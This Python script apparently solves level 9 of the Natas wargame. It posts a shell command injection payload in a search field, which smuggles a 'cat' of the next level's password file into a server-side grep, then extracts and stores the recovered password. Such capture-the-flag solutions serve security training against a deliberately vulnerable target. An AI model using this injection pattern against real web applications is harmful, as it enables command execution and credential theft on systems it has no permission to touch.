"""
natas9: shell command injection (no mitigations)
"""

import requests
from typing import Optional

from natas_utils import *

LEVEL = 9

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # path to next level's password
    flag_path = flag_file_abspath(LEVEL + 1)

    # will be injected as $key in `grep -i $key dictionary.txt`
    shell_payload = f"-- ''; cat {flag_path} #"
    response = requests.post(url, auth=login, data={"needle": shell_payload})

    candidate_passwords = extract_candidate_passwords(response.text)
    natas10_password = try_level_login(LEVEL + 1, candidate_passwords)

    return natas10_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas10_password = solve(url, login)

    if natas10_password:
        print("natas10:", natas10_password)
        store_level_password(LEVEL + 1, natas10_password)
    else:
        exit("Failed to get password for the next level.")